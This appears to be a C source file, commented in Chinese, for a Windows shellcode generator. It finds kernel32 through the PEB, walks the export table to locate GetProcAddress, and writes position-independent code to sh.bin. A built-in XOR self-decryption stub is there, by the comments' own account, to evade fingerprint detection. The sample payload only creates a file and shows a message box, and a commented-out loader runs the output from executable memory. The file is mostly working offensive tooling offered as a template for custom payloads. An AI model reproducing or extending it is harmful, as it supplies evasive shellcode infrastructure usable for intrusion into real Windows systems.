// 32位与64位 通用的 windows she11code 生成工具。
// cmd> tcc tcc_autocreate_she11code.c
// cmd> gcc tcc_autocreate_she11code.c
// 编译及其简单，带有简单的自动生带有加解密的 shellcode 防止指纹探测。
//   可在编译前设置自己加解密的密码串，让你的 shellcode 变得更加多样，“防指纹探测”功能的增强。
// 只用修改中间那一块代码，按照中间那一块的代码规则即可开发属于自己的 shellcode。
// 编译后生成的 exe 程序直接执行，会在程序路径下生成一个 sh.bin 文件，即为我们需要的 shellcode。

// 语法依 at&t 语法，
// tcc 与 gcc 均能编译并且成功执行，值得注意的是，tcc 与 gcc 编译函数的方式稍微有点不太一样。所以下面有部分使用了宏定义处理
// 为了更强的兼容性，这里将不使用 naked 的函数处理方式，防止部分 gcc 无法编译通过的情况。
// （注意，这里使用的 gcc 是旧版本的 gcc，也就是那个安装 devcpp 时附带会安装的那个旧版本。 貌似是 4.9）
// （如果是高版本的 gcc 请留意一下在 gcc_autocreate_she11code.c 的不同实现，那里兼容 naked 的函数语法）
// （不得不说我一个c语言萌新TM也没想到不同版本竟然TMD不兼容）
// gcc 不同版本造成的影响只会影响到汇编的函数跳转部分，所以正常开发即可，遇到错误需要考虑是否会是汇编的问题。
// 这里的代码支持低版本的 gcc，并且这里支持64，32位的交叉编译。

// 编写 she11code 的代码需要注意的是
// 1) 不能直接使用函数获取函数的地址，需要通过一定的汇编获取 Kernel32 的地址
// 2) 后续找到 GetProcAddress LoadLibraryA 这两个函数的地址后续基本就需要这两个函数进行处理必要函数的获取
// 3) 使用那些函数的时候也需要注意，需要从函数声明的地方获取结构声明，所有“函数声明”不会影响生成的代码的顺序和 she11code 体积。
// 4) 另外 she11code 的编写中注意不能使用任何全局变量，并且函数内“字符串声明”的方式只能使用 char[] 来实现，
//    这是为了避免字符串由于编译器优化被放到其他地方从而 she11code 不完整。
// cmd> tcc tcc_autocreate_she11code.c
// 需要生成32位则在 tcc 命令行加上 -m32 。 生成的工具 tcc_autocreate_she11code.exe 执行后会生成 sh.bin 的文件(she11code)。

#include <stdio.h>
#include <windows.h>

// ENCRYPT 是否添加 shellcode 自动加解密，默认添加
// 也是为了防止 shellcode 内一些固定的函数产生的指纹被探测到使用的
#define ENCRYPT TRUE

// ENCRYPTKEY 密码串，0-255 的数字列表；
// 如果是64位的 shellcode ，可随意修改长度，
// 如果是32位的 shellcode ，尽量不要修改密码长度，原因可看 ShellcodeDecode 函数内注释。
#define ENCRYPTKEY {1,2,3,4,5,6,7,8,9}

HMODULE getKernel32();
FARPROC getProcAddress(HMODULE hModuleBase);
void ShellcodeStart();
void ShellcodeEntry();
void ShellcodeEnd();
void CreateShellcode();
char* ShellcodeEncode(int size);
void ShellcodeDecode();

// create shellcode bin.
// int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow) {
int main(int argc, char const *argv[]) {
    #ifdef _WIN64
    printf("kernel32:       %016llx\n", getKernel32());
    printf("GetProcAddress: %016llx\n", getProcAddress((HMODULE)getKernel32()));
    #else
    printf("kernel32:       %016lx\n", getKernel32());
    printf("GetProcAddress: %016lx\n", getProcAddress((HMODULE)getKernel32()));
    #endif
    CreateShellcode();
}
void CreateShellcode(){
    HANDLE hBin = CreateFileA("sh.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    DWORD dwSize;
    DWORD dwWrite;
    if (hBin == INVALID_HANDLE_VALUE){
        printf("%s error:%d\n", "create sh.bin fail.", GetLastError());
        return;
    }
    if (ENCRYPT){
        // 自动加密处理，让生成的 shellcode 自带加密，在执行过程中会自动解密再运行
        WriteFile(hBin, ShellcodeDecode, ShellcodeStart - ShellcodeDecode, &dwWrite, NULL);
        printf("ShellcodeSize:  %16d\n", dwWrite); // 写入解密头
        char* newShellcode = ShellcodeEncode(ShellcodeEnd - ShellcodeStart);
        WriteFile(hBin, newShellcode, ShellcodeEnd - ShellcodeStart, &dwWrite, NULL);
        printf("ShellcodeSize:  %16d\n", dwWrite); // 写入加密的 shellcode
    }else{
        dwSize = ShellcodeEnd - ShellcodeStart;
        WriteFile(hBin, ShellcodeStart, dwSize, &dwWrite, NULL);
        printf("ShellcodeSize:  %16d\n", dwWrite);
    }
}

// 因为在64位系统中，函数地址用的是相对地址，所以直接用 ((char*)ShellcodeStart)[i-20] ^= 233 就能修改
// 然而在32位系统中，这些地址都是绝对地址，所以需要通过一定的计算才能获取到真实的 ShellcodeStart 地址
// 在32和64位系统中，如果编译函数的执行，使用的都是短跳转，所以两种系统下的执行都直接使用 ShellcodeStart() 即可。
char* ShellcodeEncode(int size){
    char* temp = (char *)malloc(size* sizeof(char));
    int i = 0;
    int keys[] = ENCRYPTKEY;
    for(;i < size; i++){
        temp[i] = ((char*)ShellcodeStart)[i] ^ keys[i%(sizeof(keys)/sizeof(int))];
    }
    return temp;
}
void ShellcodeDecode(){
    int i = 20;
    int keys[] = ENCRYPTKEY;
    #ifdef _WIN64
    while (i < (int)(ShellcodeEnd-ShellcodeStart)+20){
        ((char*)ShellcodeStart)[i-20] ^= keys[(i-20)%(sizeof(keys)/sizeof(int))];
        i ++;
    }
    #else
    int _addr;
        #ifdef __MINGW32__
        asm("mov 64(%esp), %eax;"); // gcc编译32位时，这里 esp 前面的数字没有看出规律，因为这不太好调试，你只要使用 64->9 这一条即可。
        #else
        asm("mov 60(%esp), %eax;"); // tcc编译32位时，这里 esp 前面的数字需要随密码长度同步修改：24+9*4=60（9是当前密码长度）
        #endif
    asm("mov %%eax, %0;":"=a"(_addr));
    _addr = _addr + ShellcodeStart-ShellcodeDecode;
    while (i < (int)(ShellcodeEnd-ShellcodeStart)+20){
        ((char*)_addr)[i-20] ^= keys[(i-20)%(sizeof(keys)/sizeof(int))];
        i++;
    }
    #endif
    ShellcodeStart(); // TINYC use this
}
// shellcode
void ShellcodeStart(){
    #ifdef __MINGW32__
        #ifdef _WIN64
        asm("pop %rbp"); 
        asm("jmp ShellcodeEntry");
        #else
        asm("pop %ebp"); 
        asm("jmp _ShellcodeEntry"); // old style. fuck!
        #endif
    #else
    ShellcodeEntry(); // TINYC use this
    #endif
}























////////////////////////////////////////////////////////////////////
// 在中间这一块代码内开发你自己的 shellcode 的功能吧
// 1 定义你使用的系统函数，从各种地方抄一份按下列相同方式修改即可
//   例如：   WINBASEAPI FARPROC  WINAPI  GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
//   修改：      typedef FARPROC (WINAPI* FN_GetProcAddress)( HMODULE hModule, LPCSTR lpProcName );
//   同理修改其他的函数。
// 1.1 用一个结构管理所有的函数，使得初始化只要一次，并且开发也会变得更加清晰
// 2 在 InitFunctions 函数内初始化你按照里面的格式初始化你要使用的系统函数
// 3 在 InitFunctions 后面定义你自己想要实现的功能函数，参数都是 (PFUNCTION pFn)
// 4 在整个 shellcode 的函数入口点 ShellcodeEntry 函数内按照下面示例执行你的功能函数即可
////////////////////////////////////////////////////////////////////

// 1 先定义需要使用到的系统函数，方便模块化开发，所有函数的初始化都放在一个结构里面会更方便使用。
// 定义结构并不会在 shellcode 的代码内体现，只会在编译时期有用。
typedef FARPROC (WINAPI* FN_GetProcAddress)( HMODULE hModule, LPCSTR lpProcName );
typedef HMODULE (WINAPI* FN_LoadLibraryA)( LPCSTR lpLibFileName );
typedef int (WINAPI* FN_MessageBoxA)( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType );
typedef HANDLE (WINAPI* FN_CreateFileA)(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
// 1.1 用来存放 shellcode 内获取到的 windows 函数的结构，统一管理会很方便开发。结构内的前两个函数是必须的。
typedef struct _FUNCTION {
    FN_GetProcAddress   fn_GetProcAddress;
    FN_LoadLibraryA     fn_LoadLibraryA;
    FN_CreateFileA      fn_CreateFileA;
    FN_MessageBoxA      fn_MessageBoxA;
}FUNCTION, *PFUNCTION;
// 2 在 InitFunctions 函数内初始化你按照里面的格式初始化你要使用的系统函数
void InitFunctions(PFUNCTION pFn){
    char szUser32[]         = {'u','s','e','r','3','2','\0'};
    char szKernel32[]       = {'k','e','r','n','e','l','3','2','\0'};
    char szLoadLibraryA[]   = {'L','o','a','d','L','i','b','r','a','r','y','A','\0'};
    char szMessageBoxA[]    = {'M','e','s','s','a','g','e','B','o','x','A','\0'};
    char szCreateFileA[]    = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
    pFn->fn_GetProcAddress  = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());
    pFn->fn_LoadLibraryA    = (FN_LoadLibraryA)pFn->fn_GetProcAddress((HMODULE)getKernel32(), szLoadLibraryA);
    // shellcode 内所使用的字符串统统使用 char 列表进行初始化。防止编译器优化到数据段里面。
    // 这是 shellcode 开发限制。因为在 shellcode 内定义的数据必须存放在 shellcode 里面。
    // 前面两个函数是一般都是固定的 pFn->fn_GetProcAddress, pFn->fn_LoadLibraryA
    // 在这之后都使用 pFn里面的 pFn->fn_GetProcAddress 和 pFn->fn_LoadLibraryA 来获取你想要的函数地址
    // 示例如下：
    pFn->fn_MessageBoxA     = (FN_MessageBoxA)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szUser32), szMessageBoxA);
    pFn->fn_CreateFileA     = (FN_CreateFileA)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szCreateFileA);
}
// 3 所有你需要实现的功能使用函数装起来，并且都用 PFUNCTION 接收初始化参数，方便使用。
//   这里给了两个函数示例。（一个在目标程序路径下创建1.txt文件，一个是直接弹窗）
void WKCreateFile(PFUNCTION pFn){
    char szFileName[] = {'.','/','1','.','t','x','t','\0'};
    pFn->fn_CreateFileA(szFileName,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
}
void WKMessageBox(PFUNCTION pFn){
    pFn->fn_MessageBoxA(NULL,NULL,NULL,0);
}
// 4 整个 shellcode 功能函数的入口点，在里面实现初始化，执行功能等……
void ShellcodeEntry(){
    FUNCTION fn;
    InitFunctions(&fn);
    WKCreateFile(&fn);
    WKMessageBox(&fn);
}




















// 后面是获取 kernel32 地址以及获取 GetProcAddress 函数地址的两个重要函数
// 同时适配了 tcc/gcc 的 32/64 位的编译情况。请勿修改！
#ifdef _WIN64
HMODULE getKernel32(){
    asm("mov %gs:(0x60), %rax");
    asm("mov 0x18(%rax), %rax");
    asm("mov 0x20(%rax), %rax");
    asm("mov (%rax), %rax");
    asm("mov (%rax), %rax");
    asm("mov 0x20(%rax), %rax");
    #ifdef __MINGW32__
    asm("pop %rbp"); // sometime you cannot use naked func, this is for more compatibility.
    asm("ret"); // TINYC dnot need this
    #endif
}
#else
HMODULE getKernel32(){
    asm("mov %fs:(0x30), %eax");
    asm("mov 0x0c(%eax), %eax");
    asm("mov 0x14(%eax), %eax");
    asm("mov (%eax), %eax");
    asm("mov (%eax), %eax");
    asm("mov 0x10(%eax), %eax");
    #ifdef __MINGW32__
    asm("pop %ebp"); // sometime you cannot complier naked func, this is for more compatibility.
    asm("ret"); // TINYC dnot need this
    #endif
}
#endif
FARPROC getProcAddress(HMODULE hModuleBase){
    LPBYTE lpBaseAddr = (LPBYTE)hModuleBase;
    PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);
    LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);
    LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);
    FARPROC GetProcAddressAPI;
    UINT i = 0;
    for (; i < pExportDir->NumberOfNames; i++){
        LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
        if (    pFuncName[0] == 'G' &&
                pFuncName[1] == 'e' &&
                pFuncName[2] == 't' &&
                pFuncName[3] == 'P' &&
                pFuncName[4] == 'r' &&
                pFuncName[5] == 'o' &&
                pFuncName[6] == 'c' &&
                pFuncName[7] == 'A' &&
                pFuncName[8] == 'd' &&
                pFuncName[9] == 'd' &&
                pFuncName[10] == 'r' &&
                pFuncName[11] == 'e' &&
                pFuncName[12] == 's' &&
                pFuncName[13] == 's'     ){
            GetProcAddressAPI = (FARPROC)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
            return GetProcAddressAPI;
        }
    }
    return NULL;
}
void ShellcodeEnd(){
}



// 测试 shellcode 的工具的代码
// // 注意，编译工具编译的环境，32位的 shellcode 只能使用 32位编译出来的工具
// #include <stdio.h>
// #include <windows.h>
// #pragma comment(lib, "user32")
// int main(int argc, char const *argv[]) {
//     HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
//     if (hFile == INVALID_HANDLE_VALUE){
//         printf("error:%d\n", GetLastError());
//         return -1;
//     }
//     DWORD dwSize;
//     dwSize = GetFileSize(hFile, NULL);
//     LPVOID lpAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//     if (lpAddress == NULL){
//         printf("error:%d\n", GetLastError());
//         CloseHandle(hFile);
//         return -1;
//     }
//     DWORD dwRead;
//     ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);
//     ((void(*)(void))lpAddress)();
//     MessageBoxA(NULL,"this box is show means that shellcode dnot kill this execute.", "test", 0);
//     return 0;
// }